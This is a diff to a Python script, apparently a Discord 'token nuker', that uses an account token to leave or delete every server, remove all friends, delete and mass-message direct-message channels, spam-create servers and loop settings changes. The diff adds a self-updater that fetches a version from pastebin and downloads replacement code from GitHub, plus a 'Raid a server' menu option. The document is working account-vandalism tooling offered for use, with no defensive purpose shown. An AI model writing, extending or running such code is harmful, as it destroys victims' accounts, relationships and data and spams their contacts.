@@ -1,16 +1,38 @@
-import threading, requests, discord, random, time, os
+import threading, requests, discord, random, time, os, urllib
 
 from colorama import Fore, init
 from selenium import webdriver
 from datetime import datetime
 from itertools import cycle
 
+def version():
+    currentversion = 1
+    print("Checking if you have the latest version.")
+    ver = urllib.request.urlopen("https://pastebin.com/raw/3JcRd4MC")
+    for line in ver:
+        version = line.decode("utf-8")
+        print(f"You are using version - V{currentversion}")
+        print(f"Latest version - V{version}")
+        time.sleep(2)
+
+        if version > str(currentversion):
+            print("\nYou have an outdated version, downloading latest.")
+            urllib.request.urlretrieve("https://raw.githubusercontent.com/iiLeafy/Discord-Account-Fucker/main/fucker.py", 'fucker.py')
+            urllib.request.urlretrieve("https://raw.githubusercontent.com/iiLeafy/Discord-Account-Fucker/main/README.md", 'README.md')
+            print("Latest has been downloaded, you can close this and re-open.")
+            time.sleep(9999)
+        elif version == str(currentversion):
+            print("You have the latest version.")
+            time.sleep(2)
+            clear()
+
 init(convert=True)
 guildsIds = []
 friendsIds = []
-channelIds = []
+privatechannelIds = []
 clear = lambda: os.system('cls')
 clear()
+version()
 
 class Login(discord.Client):
     async def on_connect(self):
@@ -20,8 +42,8 @@ class Login(discord.Client):
         for f in self.user.friends:
             friendsIds.append(f.id)
 
-        for c in self.private_channels:
-            channelIds.append(c.id)
+        for pc in self.private_channels:
+            privatechannelIds.append(pc.id)
 
         await self.logout()
 
@@ -72,27 +94,17 @@ def tokenInfo(token):
 
 def tokenFuck(token):
     headers = {'Authorization': token}
-    gdel = input(f'Would you like to delete all guilds on this account. y/n [No Capitals] > ')
-    fdel = input('Would you like to remove all friends on this account. y/n [No Capitals] > ')
-    sendall = input('Would you like to send a dm to all recent dms on this account. y/n [No Capitals] > ')
-    fremove = input('Would you like to remove all recent dms on this account. y/n [No Capitals] > ')
-    gleave = input('Would you like to leave all guilds on this account. y/n [No Capitals] > ')
-    gcreate = input('Would you like to spam create guilds on this account.  y/n [No Capitals] > ')
-    dlmode = input('Would you like to spam change through light and dark mode. y/n [No Capitals] > ')
-    langspam = input('Would you like to spam change the user\'s language. y/n [No Capitals] > ')
+    gdel = input(f'Would you like to delete all guilds on this account. y/n > ')
+    fdel = input('Would you like to remove all friends on this account. y/n > ')
+    sendall = input('Would you like to send a dm to all recent dms on this account. y/n > ')
+    fremove = input('Would you like to remove all recent dms on this account. y/n > ')
+    gleave = input('Would you like to leave all guilds on this account. y/n > ')
+    gcreate = input('Would you like to spam create guilds on this account.  y/n  > ')
+    dlmode = input('Would you like to spam change through light and dark mode. y/n > ')
+    langspam = input('Would you like to spam change the user\'s language. y/n > ')
     print(f"[{Fore.RED}+{Fore.RESET}] Nuking...")
 
-    if sendall == 'y':
-        try:
-            sendmessage = input('What do you want to send to everyone on the recent dms. > ')
-            for id in channelIds:
-                requests.post(f'https://discord.com/api/v8/channels/{id}/messages', headers=headers, data={"content": f"{sendmessage}"})
-                print(f'Sent message to private channel ID of {id}')
-                time.sleep(1)
-        except Exception as e:
-            print(f'Error detected, ignoring. {e}')
-
-    if gleave == 'y':
+    if gleave.lower() == 'y':
         try:
             for guild in guildsIds:
                 requests.delete(f'https://discord.com/api/v8/users/@me/guilds/{guild}', headers=headers)
@@ -100,7 +112,7 @@ def tokenFuck(token):
         except Exception as e:
             print(f'Error detected, ignoring. {e}')
 
-    if fdel == 'y':
+    if fdel.lower() == 'y':
         try:
             for friend in friendsIds:
                 requests.delete(f'https://discord.com/api/v8/users/@me/relationships/{friend}', headers=headers)
@@ -108,15 +120,25 @@ def tokenFuck(token):
         except Exception as e:
             print(f'Error detected, ignoring. {e}')
 
-    if fremove == 'y':
+    if sendall.lower() == 'y':
         try:
-            for id in channelIds:
+            sendmessage = input('What do you want to send to everyone on the recent dms. > ')
+            for id in privatechannelIds:
+                requests.post(f'https://discord.com/api/v8/channels/{id}/messages', headers=headers, data={"content": f"{sendmessage}"})
+                print(f'Sent message to private channel ID of {id}')
+                time.sleep(1)
+        except Exception as e:
+            print(f'Error detected, ignoring. {e}')
+
+    if fremove.lower() == 'y':
+        try:
+            for id in privatechannelIds:
                 requests.delete(f'https://discord.com/api/v8/channels/{id}', headers=headers)
                 print(f'Removed private channel ID {id}')
         except Exception as e:
             print(f'Error detected, ignoring. {e}')
 
-    if gdel == 'y':
+    if gdel.lower() == 'y':
         try:
             for guild in guildsIds:
                 requests.delete(f'https://discord.com/api/v8/guilds/{guild}', headers=headers)
@@ -124,7 +146,7 @@ def tokenFuck(token):
         except Exception as e:
             print(f'Error detected, ignoring. {e}')
 
-    if gcreate == 'y':
+    if gcreate.lower() == 'y':
         try:
             gname = input('What would you like the spammed server name be. > ')
             gserv = input('How many servers would you like to be made. [max is 100 by discord]')
@@ -135,13 +157,13 @@ def tokenFuck(token):
         except Exception as e:
             print(f'Error detected, ignoring. {e}')
 
-    if dlmode == 'y':
+    if dlmode.lower() == 'y':
         try:
             modes = cycle(["light", "dark"])
         except Exception as e:
             print(f'Error detected, ignoring. {e}')
 
-    if langspam == 'y':
+    if langspam.lower() == 'y':
         try:
             while True:
                 setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'de', 'lt', 'lv', 'fi', 'se'])}
@@ -149,6 +171,7 @@ def tokenFuck(token):
         except Exception as e:
             print(f'Error detected, ignoring. {e}')
 
+    print("\nToken has been fucked, you can close this now.")
     time.sleep(9999)
 
 def getBanner():
@@ -156,6 +179,7 @@ def getBanner():
                 [{Fore.RED}1{Fore.RESET}] Token fuck the account
                 [{Fore.RED}2{Fore.RESET}] Grab info about the account
                 [{Fore.RED}3{Fore.RESET}] Log into a token
+                [{Fore.RED}4{Fore.RESET}] Raid a server.
 
     '''.replace('░', f'{Fore.RED}░{Fore.RESET}')
     return banner
